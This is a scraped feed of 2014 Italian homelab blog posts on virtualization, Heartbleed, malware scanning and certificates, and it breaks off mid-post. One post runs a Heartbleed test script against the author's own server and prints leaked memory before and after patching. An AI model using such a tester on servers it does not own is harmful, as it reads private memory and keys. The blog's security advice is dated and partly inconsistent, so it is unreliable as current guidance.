http://www.homelab.it/index.php/2014/04/17/nested-virtualization-installare-xenserver-su-vsphere-esxi-5-5-full-virtualization/\n Avete creato una VM su XenServer e volete aggiungere un secondo disco locale post installazione?\nBene, bastano pochissimi passaggi:\n1) Creazione del secondo virtual disk Tramite vSphere C#/Web Client aggiungere un nuovo virtual disk delle dimensioni desiderate:\n2) Preparazione e creazione storage Collegarsi tramite ssh alla console di XenServer e controllare la presenza del nuovo disco (/dev/sdb nella mia configurazione):","title":"Come aggiungere un disco locale su XenServer 6.2 senza XenCenter"},{"content":" Introduzione all’installazione di XenServer su ESXi 5.5 Guida passo dopo passo alla virtualizzazione dell’hypervisor XenServer 6.2 all’interno di un ambiente vSphere ESXi 5.5\nI prerequisiti li trovate a questo indirizzo:\nhttp://www.homelab.it/index.php/2014/04/16/nested-virtualization-preparare-lambiente-vsphere-esxi-5-5-ad-ospitare-altri-hypervisor/\nRiassunto operazioni da effettuare:\n  Creare una VM con GuestOS RHEL 6\n  Selezionare Ethernet E1000 e controller SCSI “LSI Logic Parallel”\n  Abilitare EPT/RVI MMU\n  Cambiare GuestOS in ESXi 5.x\n  Montare ISO XenServer 6.2\n  Collegarsi tramite SSH client verso l’ESXi ed aggiungere il parametro vhv.enable = “TRUE” dentro il file .vmx della VM\n  Inizializzare installazione XenServer\n  Eseguire XenCenter Client e collegarsi al Server\n  Video Guida:   ","permalink":"https://www.homelab.it/index.php/2014/04/17/nested-virtualization-installare-xenserver-su-vsphere-esxi-5-5-full-virtualization/","summary":"Introduzione all’installazione di XenServer su ESXi 5.5 Guida passo dopo passo alla virtualizzazione dell’hypervisor XenServer 6.2 all’interno di un ambiente vSphere ESXi 5.5\nI prerequisiti li trovate a questo indirizzo:\nhttp://www.homelab.it/index.php/2014/04/16/nested-virtualization-preparare-lambiente-vsphere-esxi-5-5-ad-ospitare-altri-hypervisor/\nRiassunto operazioni da effettuare:\n  Creare una VM con GuestOS RHEL 6\n  Selezionare Ethernet E1000 e controller SCSI “LSI Logic Parallel”\n  Abilitare EPT/RVI MMU\n  Cambiare GuestOS in ESXi 5.x\n  Montare ISO XenServer 6.","title":"Installare XenServer su vSphere ESXi 5.5 (Full Virtualization – Nested Virtualization)"},{"content":"\nNested virtualization è la tecnica che permette di installare un hypervisor guest all’interno di altri (hosts).\nPer chi come me ha un virtual lab vSphere dovrà tenere conto di alcune direttive e requisiti hardware.\nRequisiti hardware Nested Virtualization Per poter installare un hypervisor x86/x64 in modalità hvm (Hardware-assisted virtualization – full virtualization) è obbligatorio possedere un processore sul proprio host ESXi con queste caratteristiche:\n Intel VT-x or AMD-V (Nested supportato per VM 32bit) Intel EPT or AMD RVI (Nested supportato anche per VM 64bit)  Per capire se la nostra CPU supporta queste caratteristiche basta fare una ricerca sui siti propetari INTEL o AMD .\nE’ possibile anche interrogare direttamente il virtualizzatore ESXi scrivendo il seguente indirizzo nel browser autenticandosi:\nhttps://_indirizzo-ip-tuo-esxi_/mob/?moid=ha-host\u0026amp;doPath=capability\nNella pagina cercare il seguente valore:\n\nConfigurazione ESXi 5.5 e Virtual Machine (VM) Sul virtualizzatore ESXi l’unica modifica da fare è quella di abilitare l’opzione Promiscuos Mode per il virtual Switch che collegherà le nested virtual machine.\n\nA differenza del virtualizzatore, ogni macchina virtuale in cui installeremo un hypervisor dovrà avere 3 caratteristiche:\n VM con Virtual Hardware versione 9 (questa operazione su ESXi 5.5 è possibile solo dal vSphere Web Client KB2007240) VM configurata con l’opzione “Hardware Virtualization” abilitata (al momento della creazione) VM configurata come GuestOS “VMware ESXi 5.x” (Dopo aver creato la VM, sarà possibile modificarla con questo guestOS   Appunto personale:\nDi solito io creo le VM dal vSphere #C client con virtual hardware versione 8, dopo però devo modificare il file .vmx ed inserirci manualmente l\u0026rsquo;opzione vhv.enable = “true”. Infine nel tab options nella configurazione della vm devo settare l\u0026rsquo;opzione \u0026quot;CPU/MMU Virtualization\u0026quot; come \u0026ldquo;Use Intel VT-X/AMD-V for instruction set virtualization and Intel EPT/AMD RVI for MMU virtualization.\u0026rdquo;\n ——————————————————————————————————-\nRiferimenti: Google e “How to Enable Nested ESXi \u0026amp; Other Hypervisors in vSphere 5.1“\n","permalink":"https://www.homelab.it/index.php/2014/04/16/nested-virtualization-preparare-lambiente-vsphere-esxi-5-5-ad-ospitare-altri-hypervisor/","summary":"Nested virtualization è la tecnica che permette di installare un hypervisor guest all’interno di altri (hosts).\nPer chi come me ha un virtual lab vSphere dovrà tenere conto di alcune direttive e requisiti hardware.\nRequisiti hardware Nested Virtualization Per poter installare un hypervisor x86/x64 in modalità hvm (Hardware-assisted virtualization – full virtualization) è obbligatorio possedere un processore sul proprio host ESXi con queste caratteristiche:\n Intel VT-x or AMD-V (Nested supportato per VM 32bit) Intel EPT or AMD RVI (Nested supportato anche per VM 64bit)  Per capire se la nostra CPU supporta queste caratteristiche basta fare una ricerca sui siti propetari INTEL o AMD .","title":"Nested Virtualization – Preparare l’ambiente vSphere ESXi 5.5 ad ospitare altri Hypervisor"},{"content":"\nHeartbleed VMware – Lista prodotti affetti dal bug: Quasi tutti i prodotti VMware rilasciati negli ultimi 2 anni utilizzano la libreria OpenSSL dalla versione 1.0.1 in poi.\nGli ingegneri della software house sono a lavoro per trovare soluzioni opportune prodotto per prodotto, il link a cui fare riferimento è questo:\nKnowledge Base: 2076225 Updated: Apr 20, 2014\nI prodotti confermati affetti dal bug sono i seguenti:\n ESXi 5.5 (for specific remediation details, see VMware Security Advisory VMSA-2014-0004) NSX for Multi-Hypervisor Manager 4.0.x and 4.1.x (for specific remediation details, see VMware Security Advisory VMSA-2014-0004) NSX 6.0.x for vSphere (for specific remediation details, see VMware Security Advisory VMSA-2014-0004) NVP 3.x (for specific remediation details, see VMware Security Advisory VMSA-2014-0004) vCenter Server 5.5, including VMware Big Data Extensions 1.x (for specific remediation details, see VMware Security Advisory VMSA-2014-0004) vFabric Web Server 5.0.x – 5.3.x (For remediation details, see the Security Advisory on Critical Updates to vFabric Web Server document.) VMware Client Integration Plug-In (CIP) version 5.5 (CIP installs the OVFTool and is used with vCD, vCHS, and vSphere for browser OVF file upload. For specific remediation details, see VMware Security Advisory VMSA-2014-0004 and http://blogs.vmware.com/vcloud/2014/04/ovf-upload-browser-plugin-vuln.html.) VMware Fusion 6.0.x (for specific remediation details, see VMware Security Advisory VMSA-2014-0004) VMware Player 6.0.x (for specific remediation details, see VMware Security Advisory VMSA-2014-0004) VMware Workstation 10.x (for specific remediation details, see VMware Security Advisory VMSA-2014-0004) VMware Horizon Mirage Edge Gateway 4.4.x (for specific remediation details, see VMware Security Advisory VMSA-2014-0004) VMware Horizon View 5.3 Feature Pack 1 (affects only the HTML Access component in the Remote Experience Agent, for specific remediation details, see VMware Security Advisory VMSA-2014-0004) VMware Horizon View Client for Android 2.1.x, 2.2.x, 2.3.x (for specific remediation details, see VMware Security Advisory VMSA-2014-0004) VMware Horizon View Client for iOS 2.1.x, 2.2.x, 2.3.x (for specific remediation details, see VMware Security Advisory VMSA-2014-0004) VMware Horizon View Client for Windows 2.3.x (for specific remediation details, see VMware Security Advisory VMSA-2014-0004) VMware Horizon Workspace 1.0 (for specific remediation details, see VMware Security Advisory VMSA-2014-0004) VMware Horizon Workspace 1.5 (for specific remediation details, see VMware Security Advisory VMSA-2014-0004) **VMware Horizon Workspace 1.8 (for specific remediation details, see VMware Security Advisory VMSA-2014-0004)**Note: Administrators who updated to Horizon Workspace Server 1.8.1 between 4/14/2014 and 4/19/2014 must update to the latest version referenced in VMware Security Advisory VMSA-2014-0004. VMware Horizon Workspace Client for Macintosh 1.5.1 (for specific remediation details, see VMware Security Advisory VMSA-2014-0004) VMware Horizon Workspace Client for Macintosh 1.5.2 (for specific remediation details, see VMware Security Advisory VMSA-2014-0004) VMware Horizon Workspace Client for Windows 1.5.1 (for specific remediation details, see VMware Security Advisory VMSA-2014-0004) VMware Horizon Workspace Client for Windows 1.5.2 (for specific remediation details, see VMware Security Advisory VMSA-2014-0004) VMware Horizon Workspace for Macintosh 1.8 (for specific remediation details, see VMware Security Advisory VMSA-2014-0004) VMware Horizon Workspace for Windows 1.8 (for specific remediation details, see VMware Security Advisory VMSA-2014-0004) VMware OVF Tool 3.5.0 (for specific remediation details, see VMware Security Advisory VMSA-2014-0004) VMware vCloud Automation Center (vCAC) 6.x (for specific remediation details, see VMware Security Advisory VMSA-2014-0004) VMware vCloud Networking and Security (vCNS) 5.1.3 (for specific remediation details, see VMware Security Advisory VMSA-2014-0004) VMware vCloud Networking and Security (vCNS) 5.5.1 (for specific remediation details, see VMware Security Advisory VMSA-2014-0004)  Invece i prodotti NON affetti dal bug sono questi:\n VMware vCloud Automation Center (vCAC) 5.x VMware vCloud Automation Center (vCAC) 6.x ESXi/ESX 4.x ESXi 5.0 ESXi 5.1 Virtual Disk Development Kit (VDDK) VIX API VMware Data Recovery VDR) VMware Fusion 5.x VMware Horizon Mirage 4.3.x and earlier VMware Horizon Mirage 4.4.x (except the Gateway component) VMware Horizon View 5.x VMware Horizon View 5.2 Feature Pack 1 VMware Horizon View 5.2 Feature Pack 2 VMware Horizon View Client for Android 1.x, 2.0.x VMware Horizon View Client for iOS 1.x, 2.0.x VMware Horizon View Client for Linux (all versions) VMware Horizon View Client for Mac (all versions) VMware Horizon View Client for Windows 2.1.x, 2.2.x, 5.x VMware Horizon View Client for Windows Store (all versions) VMware Horizon View Client for Windows with Local Mode Option 5.x VMware Horizon Workspace Client for Macintosh 1.0.0 VMware Horizon Workspace Client for Macintosh 1.5.0 VMware Horizon Workspace Client for Windows 1.0.0 VMware Horizon Workspace Client for Windows 1.5.0 VMware OVF tool 3.1.0 and below VMware Player VMware ThinApp VMware Update Manager (VUM) VMware vCenter Configuration Manager (vCM) VMware vCenter Converter (P2V) VMware vCenter Log Insight VMware vCenter Operations Manager (vCOps) VMware vCenter Orchestrator (vCO) VMware vCenter Server 4.x VMware vCenter Server 5.0 VMware vCenter Server 5.1 VMware vCenter Server Appliance (vCSA) 5.x VMware vCenter Server Heartbeat VMware vCenter Site Recovery Manager (SRM) VMware vCenter Support Assistant VMware vCloud Director (vCD) VMware vCloud Networking and Security (vCNS) 5.1.2 and below VMware vCloud Networking and Security (vCNS) 5.5.0 VMware vFabric Postgres VMware View 4.x VMware vSphere Data Protection (vDP) VMware vSphere Management Assistant (vMA) VMware vSphere Storage Appliance (VSA) VMware Workstation  Il mio consiglio è quello di consultare il KB periodicamente per aggiornarsi sulle eventuali patch rilasciate.\n","permalink":"https://www.homelab.it/index.php/2014/04/13/heartbleed-situazione-dei-prodotti-vmware/","summary":"Heartbleed VMware – Lista prodotti affetti dal bug: Quasi tutti i prodotti VMware rilasciati negli ultimi 2 anni utilizzano la libreria OpenSSL dalla versione 1.0.1 in poi.\nGli ingegneri della software house sono a lavoro per trovare soluzioni opportune prodotto per prodotto, il link a cui fare riferimento è questo:\nKnowledge Base: 2076225 Updated: Apr 20, 2014\nI prodotti confermati affetti dal bug sono i seguenti:\n ESXi 5.5 (for specific remediation details, see VMware Security Advisory VMSA-2014-0004) NSX for Multi-Hypervisor Manager 4.","title":"Heartbleed VMware – Situazione di tutti i prodotti affetti dal bug"},{"content":"I siti web più importanti e famosi sono già corsi ai ripari contro il bug Heartbleed di OpenSSL, ma come fare per visulizzare lo stato dei siti minori?\nPer google chrome ci viene in aiuto un nuovo plugin: Chromebleed\n\nUna volta installato il plugin verrà eseguito in background da chrome e in caso di navigazione verso siti affetti dal bug heartbleed, apparirà un messaggio d’errore come questo:\n","permalink":"https://www.homelab.it/index.php/2014/04/11/chromebleed-plugin-per-google-chrome-che-rileva-siti-affetti-dal-bug-heartbleed/","summary":"I siti web più importanti e famosi sono già corsi ai ripari contro il bug Heartbleed di OpenSSL, ma come fare per visulizzare lo stato dei siti minori?\nPer google chrome ci viene in aiuto un nuovo plugin: Chromebleed\n\nUna volta installato il plugin verrà eseguito in background da chrome e in caso di navigazione verso siti affetti dal bug heartbleed, apparirà un messaggio d’errore come questo:","title":"Chromebleed – Plugin per google Chrome che rileva siti affetti dal bug Heartbleed"},{"content":"E’ scoppiato il panico da cambio password, ma è davvero così necessario?!?\nLa maggior parte dei social newtork o provider in generale utilizzano sessioni criptate con hash create sul momento.\nLe password non vengono salvate in chiaro, e anche se venissero copiate in memoria non lo sarebbero in maniera decrittata.\n**La cosa fondamentale da fare è eliminare i cookies dal proprio browser quindi basta fare un semplicissimo logout..\n**\nQui di seguito potete trovare la lista dei siti più famosi nei quali è consigliato ( da parte loro) cambiare le password dopo la scoperta del bug Heartbleed (OpenSSL)\nSe volete contribuire nell’arricchire la lista, commentate l’articolo.\nGrazie!\nSito\nModificare Password?\nFacebook\nSI\nTumblr\nSI\nGoogle\nSI\nYahoo!\nSI\nGmail\nSI\nYahoo! Mail\nSI\nIntuit\nSI\nDropbox\nSI\nLastPass\nSI\nOKCupid\nSI\nSoundCloud\nSI\nWunderlist\nSI\nLinkedIn\nNO\nAmazon\nNO\nMicrosoft\nNO\nAOL\nNO\nHotmail/Outlook\nNO\nPayPal\nNO\nTwitter\nNon dichiarato\nApple\nNon dichiarato\neBay\nNon dichiarato\nNetflix\nNon dichiarato\n","permalink":"https://www.homelab.it/index.php/2014/04/11/heartbleed-password-da-cambiare-lista-siti/","summary":"E’ scoppiato il panico da cambio password, ma è davvero così necessario?!?\nLa maggior parte dei social newtork o provider in generale utilizzano sessioni criptate con hash create sul momento.\nLe password non vengono salvate in chiaro, e anche se venissero copiate in memoria non lo sarebbero in maniera decrittata.\n**La cosa fondamentale da fare è eliminare i cookies dal proprio browser quindi basta fare un semplicissimo logout..\n**\nQui di seguito potete trovare la lista dei siti più famosi nei quali è consigliato ( da parte loro) cambiare le password dopo la scoperta del bug Heartbleed (OpenSSL)","title":"Heartbleed – Password da cambiare (lista siti)"},{"content":"Come ben sapete tra ieri ed oggi è scoppiata la bomba “Heartbleed” e a sganciarla è stato un’ingegnere che lavora presso Google: Neel Mehta.\nHeartbleed è il nome che è stato dato a una pericolosissimo bug scovato sul sistema di criptazione OpenSSL che permette di entare in possesso della chiave privata con cui sono stati firmati i certificati SSL/TLS.\nConsiderato che openssl viene utilizzato dai demoni web, mail, VPN, ecc..si può capire l’enorme serietà del bug, milioni di dati personali (password, documenti, conversazioni, email) sono a rischio di divulgazione non autorizzata.\nMaggiori informazioni sono reperibili sul sito creato ad hoc: Heartbleed.com\nPer testare la vurnerabilità dei propri sistemi è disponibile uno script in python scaricabile da QUI o un sito ragguingibile da QUI\nVersioni OpenSSL\nOpenSSL 1.0.1 alla 1.0.1f (inclusa): VULNERABILI\nOpenSSL 1.0.1g : NON vunerabile\nOpenSSL 1.0.0: NON vulnerabile\nOpenSSL 0.9.8: NON vulnerabile\nTest vulnerabilità sistema pre-patch Testiamo il sistema tramite lo script python precedentemente indicato:\n[claudio@ssl_test ~]$ python heartbleed.py www.mio_apache_ssl_test.it \u0026lt;-- script rinominato heartbleed.py\rTrying SSL 3.0...\rConnecting...\rSending Client Hello...\rWaiting for Server Hello...\r... received message: type = 22, ver = 0300, length = 81\r... received message: type = 22, ver = 0300, length = 4746\r... received message: type = 22, ver = 0300, length = 525\r... received message: type = 22, ver = 0300, length = 4\rSending heartbeat request...\r... received message: type = 21, ver = 0300, length = 2\rReceived alert:\r0000: 02 0A ..\rServer returned error, likely not vulnerable\rTrying TLS 1.0...\rConnecting...\rSending Client Hello...\rWaiting for Server Hello...\r... received message: type = 22, ver = 0301, length = 58\r... received message: type = 22, ver = 0301, length = 4746\r... received message: type = 22, ver = 0301, length = 525\r... received message: type = 22, ver = 0301, length = 4\rSending heartbeat request...\r... received message: type = 24, ver = 0301, length = 16384\rReceived heartbeat response:\r0000: 02 40 00 D8 03 01 53 43 5B 90 9D 9B 72 0B BC 0C .@....SC[...r...\r0010: BC 2B 92 A8 48 97 CF BD 39 04 CC 16 0A 85 03 90 .+..H...9.......\r0020: 9F 77 04 33 D4 DE 00 00 66 C0 14 C0 0A C0 22 C0 .w.3....f.....\u0026#34;.\r0030: 21 00 39 00 38 00 88 00 87 C0 0F C0 05 00 35 00 !.9.8.........5.\r....\r...\r....\r3fd0: C6 E8 E3 CC AA 16 E7 AA E3 3A CF 8E 0C 6D 9E 77 .........:...m.w\r3fe0: 3D 30 16 DC D1 5C AF A0 72 1D 27 67 1F 6E 33 B7 =0...\\..r.\u0026#39;g.n3.\r3ff0: 77 9F 56 57 10 F3 9F 35 FA 4B E7 A7 39 EC ED 49 w.VW...5.K..9..I\rWARNING: server returned more data than it should - server is vulnerable!\r[claudio@ssl_test ~]$ Adesso passiamo alla parte più importante…\nPatch del sistema La prima azione da fare è quella di aggiornare il pacchetto openssl del proprio sistema.\nSono già disponibili le patch sui repository ufficiali delle varie distribuzioni linux.\nCentOS ha rilasciato per la release 6.5 la versione openssl-1.0.1e-16.el6_5.4.0.1 scaricabile da yum:\n[claudio@ssl_test ~]# yum update\ropenssl x86_64 1.0.1e-16.el6_5.7 updates 1.5 M Le release precedenti alla versione 6.5 non sono affette dal problema (CVE ufficiale qui)\nDopo aver aggiornato il sistema è importare eseguire 2 operazioni:\n Revoca dei vecchi certificati SSL/TLS Creazione dei nuovi certificati  Per revocare i certificati su CentOS basta eseguire i seguenti comandi:\n[root@certs_test certs]# cd /etc/pki/tls/certs [root@certs_test certs]# [root@certs_test certs]# openssl ca -keyfile server.key -cert server.crt -revoke server.crt Using configuration from /etc/pki/tls/openssl.cnf Adding Entry with serial number CE059B06EC6817D2 to DB for /C=IT/ST=Roma/L=Roma/O=Example S.r.l/OU=Example S.r.l/CN=www.example.it/emailAddress=info@example.it Revoking Certificate CE059B06EC6817D2. Data Base Updated\nPer creare i certificati invece vi rimando al mio vecchio post: CLICCA QUI\nQuesta procedura è stata testata su CentOS 6.5 ma può essere eseguita su qualsiasi distro linux apportando le modifiche appropriate (directory certificati e gestore pacchetti su tutte).\nTest vulnerabilità sistema post-patch [claudio@ssl_test ~]$ python heartbleed.py www.mio_apache_ssl_test.it\rTrying SSL 3.0...\rConnecting...\rSending Client Hello...\rWaiting for Server Hello...\r... received message: type = 22, ver = 0300, length = 86\r... received message: type = 22, ver = 0300, length = 4727\r... received message: type = 22, ver = 0300, length = 525\r... received message: type = 22, ver = 0300, length = 4\rSending heartbeat request...\rUnexpected EOF receiving record header - server closed connection\rNo heartbeat response received, server likely not vulnerable\rTrying TLS 1.0...\rConnecting...\rSending Client Hello...\rWaiting for Server Hello...\r... received message: type = 22, ver = 0301, length = 58\r... received message: type = 22, ver = 0301, length = 4727\r... received message: type = 22, ver = 0301, length = 525\r... received message: type = 22, ver = 0301, length = 4\rSending heartbeat request...\rUnexpected EOF receiving record header - server closed connection\rNo heartbeat response received, server likely not vulnerable\rTrying TLS 1.1...\rConnecting...\rSending Client Hello...\rWaiting for Server Hello...\r... received message: type = 22, ver = 0302, length = 58\r... received message: type = 22, ver = 0302, length = 4727\r... received message: type = 22, ver = 0302, length = 525\r... received message: type = 22, ver = 0302, length = 4\rSending heartbeat request...\rUnexpected EOF receiving record header - server closed connection\rNo heartbeat response received, server likely not vulnerable\rTrying TLS 1.2...\rConnecting...\rSending Client Hello...\rWaiting for Server Hello...\r... received message: type = 22, ver = 0303, length = 58\r... received message: type = 22, ver = 0303, length = 4727\r... received message: type = 22, ver = 0303, length = 527\r... received message: type = 22, ver = 0303, length = 4\rSending heartbeat request...\rUnexpected EOF receiving record header - server closed connection\rNo heartbeat response received, server likely not vulnerable\r[claudio@ssl_test ~]$ Concluse queste operazioni il sistema non è più vulnerabile dal bug, quindi non resta che sperare di non essere stati attaccati precedentemente!\n","permalink":"https://www.homelab.it/index.php/2014/04/10/heartbleed-zero-day-cve-2014-0160-openssl-consigli-utili-su-come-correre-ai-riapri/","summary":"Come ben sapete tra ieri ed oggi è scoppiata la bomba “Heartbleed” e a sganciarla è stato un’ingegnere che lavora presso Google: Neel Mehta.\nHeartbleed è il nome che è stato dato a una pericolosissimo bug scovato sul sistema di criptazione OpenSSL che permette di entare in possesso della chiave privata con cui sono stati firmati i certificati SSL/TLS.\nConsiderato che openssl viene utilizzato dai demoni web, mail, VPN, ecc..si può capire l’enorme serietà del bug, milioni di dati personali (password, documenti, conversazioni, email) sono a rischio di divulgazione non autorizzata.","title":"Heartbleed zero day (CVE-2014-0160) OpenSSL: Consigli utili su come correre ai riapri"},{"content":" Obbiettivo Installare su CentOS 6 Linux Malware Detector (LMD), shedulare scansioni ed inviare report tramite e-mail.\nScenario Linux distro: CentOS 6.5 (x86_64)\nLMD version: 1.4.2\nSelinux: SI\nInstallazione Linux Malware Detector Scaricare l’ultima versione disponibile di LMD dal sito ufficiale:\n[root@lmd_test tmp]# cd /tmp\r[root@lmd_test tmp]#\r[root@lmd_test tmp]# wget wget http://www.rfxn.com/downloads/maldetect-current.tar.gz\r....\r....\r....\r2014-04-07 19:53:30 (491 KB/s) - \u0026#34;maldetect-current.tar.gz\u0026#34; salvato [811467/811467] Scompattare l’archivio ed installare il software linux malware detector:\n[root@lmd_test tmp]# tar xvfz maldetect-current.tar.gz\rmaldetect-1.4.2/\rmaldetect-1.4.2/CHANGELOG\rmaldetect-1.4.2/cron.daily\rmaldetect-1.4.2/README\r....\r....\r...\rmaldetect-1.4.2/.ca.def\rmaldetect-1.4.2/install.sh\r[root@lmd_test tmp]# cd maldetect-1.4.2/\r[root@lmd_test maldetect-1.4.2]# ./install.sh\rLinux Malware Detect v1.4.2\r(C) 2002-2013, R-fx Networks \u0026lt;proj@r-fx.org\u0026gt;\r(C) 2013, Ryan MacDonald \u0026lt;ryan@r-fx.org\u0026gt;\rinotifywait (C) 2007, Rohan McGovern \u0026lt;rohan@mcgovern.id.au\u0026gt;\rThis program may be freely redistributed under the terms of the GNU GPL\rinstallation completed to /usr/local/maldetect\rconfig file: /usr/local/maldetect/conf.maldet\rexec file: /usr/local/maldetect/maldet\rexec link: /usr/local/sbin/maldet\rexec link: /usr/local/sbin/lmd\rcron.daily: /etc/cron.daily/maldet\rmaldet(1574): {sigup} performing signature update check...\rmaldet(1574): {sigup} local signature set is version 201205035915\rmaldet(1574): {sigup} new signature set (201404059860) available\rmaldet(1574): {sigup} downloaded http://cdn.rfxn.com/downloads/md5.dat\rmaldet(1574): {sigup} downloaded http://cdn.rfxn.com/downloads/hex.dat\rmaldet(1574): {sigup} downloaded http://cdn.rfxn.com/downloads/rfxn.ndb\rmaldet(1574): {sigup} downloaded http://cdn.rfxn.com/downloads/rfxn.hdb\rmaldet(1574): {sigup} downloaded http://cdn.rfxn.com/downloads/maldet-clean.tgz\rmaldet(1574): {sigup} signature set update completed\rmaldet(1574): {sigup} 11669 signatures (9783 MD5 / 1886 HEX) Scansione manuale con Linux Malware Detector Ponendo il caso di voler eseguire una scansione della directory “/web“, digitare:\n[root@lmd_test maldetect-1.4.2]# maldet --scan-all /web\rLinux Malware Detect v1.4.2\r(C) 2002-2013, R-fx Networks \u0026lt;proj@r-fx.org\u0026gt;\r(C) 2013, Ryan MacDonald \u0026lt;ryan@r-fx.org\u0026gt;\rinotifywait (C) 2007, Rohan McGovern \u0026lt;rohan@mcgovern.id.au\u0026gt;\rThis program may be freely redistributed under the terms of the GNU GPL v2\rmaldet(1683): {scan} signatures loaded: 11669 (9783 MD5 / 1886 HEX)\rmaldet(1683): {scan} building file list for /web, this might take awhile...\rmaldet(1683): {scan} file list completed, found 9815 files...\rmaldet(1683): {scan} 9815/9815 files scanned: 0 hits 0 cleaned\rmaldet(1683): {scan} scan completed on /web: files 9815, malware hits 0, cleaned hits 0\rmaldet(1683): {scan} scan report saved, to view run: maldet --report 040714-1155.1683 Per leggere il report in maniera dettagliata bisogna far riferimento all’ultima riga dell’output di scansione:\nmaldet(1683): {scan} scan report saved, to view run: maldet --report 040714-1155.1683 Schedulazione scansioni ed invio report L’installazione di LMD crea in automatico un cronjob giornaliero, il file di riferimento è “/etc/cron.daily/maldet“.\nCon l’editor preferito, sostituire il path della directory da controllare modificando il file da così:\n# scan default apache docroot paths\rif [ -d \u0026#34;/var/www/html\u0026#34; ]; then\r/usr/local/maldetect/maldet -b -r /web 2 \u0026gt;\u0026gt; /dev/null 2\u0026gt;\u0026amp;1\rfi a così:\n# scan default apache docroot paths\rif [ -d \u0026#34;/web\u0026#34; ]; then\r/usr/local/maldetect/maldet -b -r /web 2 \u0026gt;\u0026gt; /dev/null 2\u0026gt;\u0026amp;1\rfi Se vogliamo ricevere per e-mail il report della scansione , si devono modificare alcune opzioni del file di configurazione “/usr/local/maldetect/conf.maldet“, in particolare:\n##\r# [ EMAIL ALERTS ]\r##\r# The default email alert toggle\r# [0 = disabled, 1 = enabled]\remail_alert=0\r# The subject line for email alerts\remail_subj=\u0026#34;maldet alert from $(hostname)\u0026#34;\r# The destination addresses for email alerts\r# [ values are comma (,) spaced ]\remail_addr=\u0026#34;you@domain.com\u0026#34;\r# Ignore e-mail alerts for reports in which all hits have been cleaned.\r# This is ideal on very busy servers where cleaned hits can drown out\r# other more actionable reports.\remail_ignore_clean=1 Monitoraggio in tempo reale LMD tra le su caratteristiche ha anche la scansione in tempo reale, per abilitarla basta eseguire il comando:\nmaldet --monitor /web\nQuarantena Di default la quarantena di LMD non è attiva, per abilitarla basta modificare un parametro nel file di configurazione:\n##\r# [ QUARANTINE OPTIONS ]\r##\r# The default quarantine action for malware hits\r# [0 = alert only, 1 = move to quarantine \u0026amp; alert]\rquar_hits=1 ","permalink":"https://www.homelab.it/index.php/2014/04/08/come-installare-linux-malware-detect-lmd-su-centos-6-x-schedulare-scanasioni-ed-inviare-report-tramite-e-mail/","summary":"Obbiettivo Installare su CentOS 6 Linux Malware Detector (LMD), shedulare scansioni ed inviare report tramite e-mail.\nScenario Linux distro: CentOS 6.5 (x86_64)\nLMD version: 1.4.2\nSelinux: SI\nInstallazione Linux Malware Detector Scaricare l’ultima versione disponibile di LMD dal sito ufficiale:\n[root@lmd_test tmp]# cd /tmp\r[root@lmd_test tmp]#\r[root@lmd_test tmp]# wget wget http://www.rfxn.com/downloads/maldetect-current.tar.gz\r....\r....\r....\r2014-04-07 19:53:30 (491 KB/s) - \u0026#34;maldetect-current.tar.gz\u0026#34; salvato [811467/811467] Scompattare l’archivio ed installare il software linux malware detector:","title":"Come installare Linux Malware Detect (LMD) su CentOS 6.x, schedulare scanasioni ed inviare report tramite e-mail"},{"content":"Creare certificati SSL/TLS su CentOS 6 è molto semplice grazie ad alcuni script messi a disposizione dalla distribuzione.\nQuesti certificati potranno essere integrati alla configurazione di postfix, sendmail, apache, dovecot ecc…\nScenario e requisiti Ambiente di test\n Versione Linux: CentOS 6.5 (x86_64) Dominio: www.example.it  Prerequisiti\n openssl  Creazione chiave e certificati  Con l’utenza di root, entrare nella directory contenente gli script e creare la chiave privata:  [root@certs_test ~]# cd /etc/pki/tls/certs [root@certs_test certs]# [root@certs_test certs]# make server.key umask 77 ; \\ /usr/bin/openssl genrsa -aes128 2048 \u0026gt; server.key Generating RSA private key, 2048 bit long modulus ............................................................................................+++ ...............................................................................................................+++ e is 65537 (0x10001) Enter pass phrase: \u0026lt;--- Inserire una password per la generazione della chiave Verifying - Enter pass phrase: \u0026lt;--- Reinserire la password Rimuovere la password dalla chiave privata (Altrimenti verrebbe richiesta ogni volta che un qualsiasi servizio cercasse di caricare il certificato).  [root@certs_test certs]# openssl rsa -in server.key -out server.key Enter pass phrase for server.key: \u0026lt;--- Reinserire la password writing RSA key Creare un certificato X509 auto-firmato con la chiave RSA precedentemente generata:  [root@certs_test certs]# make server.csr umask 77 ; \\ /usr/bin/openssl req -utf8 -new -key server.key -out server.csr You are about to be asked to enter information that will be incorporated into your certificate request. What you are about to enter is what is called a Distinguished Name or a DN. There are quite a few fields but you can leave some blank For some fields there will be a default value, If you enter \u0026#39;.\u0026#39;, the field will be left blank. ----- Country Name (2 letter code) [XX]:IT State or Province Name (full name) []:Roma Locality Name (eg, city) [Default City]:Roma Organization Name (eg, company) [Default Company Ltd]:Example S.r.l Organizational Unit Name (eg, section) []:Example S.r.l Common Name (eg, your name or your server\u0026#39;s hostname) []:www.example.it Email Address []:info@example.it Please enter the following \u0026#39;extra\u0026#39; attributes to be sent with your certificate request A challenge password []: \u0026lt;-- Lasciare vuto An optional company name []: \u0026lt;-- Lasciare vuoto [root@certs_test certs]# touch /etc/pki/CA/index.txt [root@certs_test certs]# echo 1000 \u0026gt; /etc/pki/CA/serial [root@certs_test certs]# [root@certs_test certs]# openssl x509 -in server.csr -out server.crt -req -signkey server.key -days 1825 \u0026lt;--- valido per 5 anni Signature ok subject=/C=IT/ST=Roma/L=Roma/O=Example S.r.l/OU=Example S.r.l/CN=www.example.it/emailAddress=info@example.it Getting Private key Cambiare i permessi in sola lettura della chiave e dei certificati:  [root@certs_test certs]# chmod 400 server.*\n","permalink":"https://www.homelab.it/index.php/2014/04/06/centos-come-creare-i-certificati-ssl/","summary":"Creare certificati SSL/TLS su CentOS 6 è molto semplice grazie ad alcuni script messi a disposizione dalla distribuzione.\nQuesti certificati potranno essere integrati alla configurazione di postfix, sendmail, apache, dovecot ecc…\nScenario e requisiti Ambiente di test\n Versione Linux: CentOS 6.5 (x86_64) Dominio: www.example.it  Prerequisiti\n openssl  Creazione chiave e certificati  Con l’utenza di root, entrare nella directory contenente gli script e creare la chiave privata:  [root@certs_test ~]# cd /etc/pki/tls/certs [root@certs_test certs]# [root@certs_test certs]# make server.","title":"CentOS: Come creare i certificati SSL/TLS autofirmati"},{"content":"Installare e configurare wordpress è veramente semplice, soprattutto grazie al suo wizard user friendly.\nCome spesso accade però le configurazioni di default necessitanto di ritocchi.\nUna delle principali personalizzazioni da eseguire è quella di impedire la lettura degli utenti wordpress da remoto.\nPer testare l’importanza di 